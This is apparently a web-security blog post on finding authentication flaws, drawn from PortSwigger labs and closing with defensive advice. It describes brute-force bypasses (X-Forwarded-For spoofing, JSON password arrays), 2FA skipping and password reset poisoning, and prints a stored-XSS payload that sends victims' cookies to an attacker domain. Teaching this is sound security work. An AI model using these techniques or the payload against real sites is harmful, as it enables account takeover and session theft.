---
layout: post
title: 'How to find the Authentication Vulnerabilities?'
tags: [Web Security, Bug Bounty, Authentication]
color: rgb(100,50,200)
permalink: authentication-vulnerabilities/
author: shivamsaraswat
excerpt_separator: <!--more-->
---

Whenever we talk about how to find authentication vulnerabilities, first we should look at what is the meaning of authentication?

Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they really are who they claim to be.

<!--more-->

<hr>

<h1 id="contents-">Contents <a name="top"></a></h1>
* TOC
{:toc}

<hr>

## Overview

* As websites are accessible to anyone with an internet connection, strong authentication methods are necessary to ensure the security of the website.
* In this post, I have talked about the impact of vulnerable authentication, how to test for vulnerabilities in password-based authentication, MFA, password reset and change functionality.
* I have also discussed how to secure the authentication mechanisms.

<center><img src="/assets/img/web-security/authentication.svg" alt="Authentication Vulnerabilities"></center>
<!-- <center>Source: PortSwigger</center> -->
*[Image Source](https://portswigger.net/web-security/authentication)*

<hr>

## How Authentication can be categorized?

There are three authentication factors into which different types of authentication can be categorized:
- Something you **know**, such as a password or the answer to a security question.
- Something you **have**, that is, a physical object like a mobile phone or security token.
- Something you **are** or do, for example, your biometrics or patterns of behavior.

<hr>

## What is the difference between Authentication and Authorization?
    
**Authentication** is the process of verifying that a user really ***is who they claim to be***, whereas **authorization** involves verifying whether a user ***is allowed to do something***.

<!-- For example, while logging into the website, we have prove that is the  -->

<hr>

## How do authentication vulnerabilities arise?

Broadly in one of two ways:

- The **authentication mechanisms are weak** because they fail to adequately protect against brute-force attacks.
- **Logic flaws** or **poor coding** in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes referred to as "**broken authentication**".

<hr>

## What is the impact of vulnerable authentication?

- Can be a severe impact.
- Once an attacker has either bypassed authentication or has brute-forced their way into another user's account, they have access to all the data and functionality that the compromised account has.
- Even though low-privileged user does not give the attacker access to any sensitive information but it can allow the attacker to access additional pages which can provide a further attack surface and give ideas to the attacker how the application is working after authentication.
- Often, certain high-severity attacks will not be possible from publicly accessible pages, but they may be possible from an internal page.

<hr>

## Types of Authentication Mechanisms

There are various types of Authentication mechanisms where vulnerabilities can come up -
1. In password-based login
2. In multi-factor authentication (MFA)
3. In other authentication mechanisms
    - In stay-logged-in cookie
    - In password reset logic
    - In password change feature

<hr>

Now the main question of this post -
## How to find the Authentication Vulnerabilities?

**NOTE**: I have used the examples from [PortSwigger Labs](https://portswigger.net/web-security/all-labs#authentication).

### Testing for Password-Based Login

* Test for Default Credentials because many web applications and hardware devices have default passwords for the built-in administrative account. Determine whether the application has any user accounts with default passwords and check if new user accounts are created with weak or predictable passwords.
* Never directly jump to brute-forcing usernames and passwords.
* First, enumerate (brute-force) the valid usernames, then use those to find the valid password.
* This greatly reduces the time and effort required to brute-force a login because the attacker is able to quickly generate a shortlist of valid usernames.
* While attempting to brute-force a login page, always pay attention to any differences in:
    - **Status codes:** It is a best practice for websites to always return the same status code. But this is not always followed. So, if the guess is correct then the website may return the different status code than others. 
    - **Error messages:** It is best practice for websites to use generic messages whatever the case is - whether both the username AND password are incorrect or only the password was incorrect. But this is not always followed. So, check if there is any typing error or something different in the message.
    - **Response times:** It is best practice for websites to return the similar response time even if username or password is incorrect. If there is any deviation in the response time, this indicates that username or password could be correct.
* Sometimes *increasing the password length* increases the response time if the username is valid and application tries to validate the password.
* Sometimes, developers implement the **brute-force protection**:
    - Blocking the remote user's IP address if they make too many login attempts (IP-based brute-force protection)
    - Locking the account that the remote user is trying to access if they make too many failed login attempts (Account Lockout)
    - User rate limiting
* To bypass IP-based brute-force protection:
    - Use **[X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)** header (it is like changing your IP address on every request).
    - If your IP is temporarily blocked on submitting 3 incorrect logins in a row, check if you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.
* Locking an account offers a certain amount of protection against targeted brute-forcing of a specific account. But nothing is fully secure.
    - Developers implement brute-force protection on too many requests (let's say, after 3 attempts) but there can be a flaw in the implementation that even we cross the limit and get error message such as “You have made too many incorrect login attempts. Please try again in 1 minute(s).”, if we give the correct password even within 1 min, the application doesn't gives this error message, which in normal case should not happen.
    - Account locking also fails to protect against *credential stuffing* attacks. This involves using a massive dictionary of `username:password` pairs, composed of genuine login credentials stolen in data breaches.
* User rate limiting is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request.
    - If the application is allowing the login credentials to be submitted in JSON format, then we can try replacing the single string value of the password with an array of strings containing all of the candidate passwords to be brute-forced.
        ```
        "username" : "victim",
        "password" : [
        "123456",
        "password",
        "qwerty"
        ...
        ]
        ```

### Testing for Multi-Factor Authentication (MFA)

* Sometimes, the implementation of 2FA is flawed to the point where it can be bypassed entirely.
* If the user is asked to enter a password first, and then asked to enter a verification code on a different page, the user is already in "logged in"state before entering the verification code. This is because the user has already entered the password. In this case, try to skip the first authentication step and go straight to "logged-in only" pages.
* Sometimes, after a user has finished the first step of 2FA, the website doesn't always check well enough to make sure that the same user is doing the second step. If the attacker is then able to brute-force the verification code, they could log in to any user's account just by knowing their username, password is not needed at all. This is very dangerous.
* Some websites try to prevent brute-force attacks on 2FA codes by logging users out automatically after a certain number of wrong verification codes. But this is also not perfect because an advanced attacker can just automate this multi-step process by [creating macros](https://portswigger.net/burp/documentation/desktop/settings/sessions/macros) for Burp Intruder. The [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) extension can also be used for this purpose.

### Testing for Other Authentication Mechanisms

* It is best practice for `stay-logged-in` cookie to be impractical to guess. However, some websites generate this cookie based on a username, a timestamp or a password. For example, a `stay-logged-in` cookie can be in this format - `base64(username+':'+md5HashOfPassword)`. Using a simple two-way encoding like Base64 offers no protection.
* If the **[stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)** is present in the comment section of the blog post of a website, then the attacker can just post a comment containing some XSS payload (as shown below) and whenever a user visit this post, this will send the cookies (such as `stay-logged-in` cookie) of the user to the attacker. 
    ```
    <script>document.location='//attacker-domain/'+document.cookie</script>
    ```
* A robust method of resetting passwords is to send a *unique URL* to users that takes them to a password reset page. This unique URL can be made of a high-entropy, hard-to-guess token. For example-
    ```
    http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
    ```
    This token should expire after a short period of time and be destroyed immediately after the password has been reset.<br>
    However, some websites fail to also validate the token again when the reset form is submitted. In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password.
* If the URL in the reset email is generated *dynamically*, this may also be vulnerable to password reset poisoning. In this case, an attacker can potentially steal another user's token and use it change their password.<br>
    - **[Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)** can occur when a website relies on header values to direct traffic or craft page links. If left unchecked, an attacker can inject their own values and modify the intended behavior of the application.
    - Social engineering and **[Host Header Injection](https://portswigger.net/web-security/host-header)** increases the probability of this attack.
* Ideally, *password change* functionality is available only to logged in users. But sometimes application allows an attacker to access this page directly without being logged in as the victim user. This is why an attacker can just use his/her account password reset request to brute-force password of other users.

<hr>

## How to Secure Your Authentication Mechanisms?

* Verify that no login credentials are exposed in HTTP responses or profiles that are viewable by the general public.
* Implement an effective password policy, don't count on users for security.
* Whether or not a username is valid, use identical, generic error messages. Each login request should return the same HTTP status code, and response times should be as similar as possible.
* Prevent IP spoofing to make IP-based user rate limiting more effective. 
* After a certain number of login attempts, you should require a CAPTCHA.
* Auditing verification or validation logic to eliminate flaws is crucial for strong authentication.
* Make password reset or change functionality equally robust.
* Implement 2FA using a dedicated device or app that generates the verification code directly. Also, make sure that the logic in your 2FA checks is sound so that it cannot be easily bypassed.

<hr>

**I hope, this post helped you to understand what is authentication, what are the security issues can occur if security controls are not followed correctly and you must have learned something new.**

**Feel free to [contact me](/contact/) for any suggestions and feedbacks. I would really appreciate those.**

Thank you for reading!

You can also **[Buy Me A Coffee](https://www.buymeacoffee.com/cybersapien)** if you love the content and want to support this blog page!

<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="cybersapien" data-color="#FFDD00" data-emoji=""  data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#ffffff" ></script>

<a href="#top" style="float: right"><strong>Back to Top⮭</strong> </a>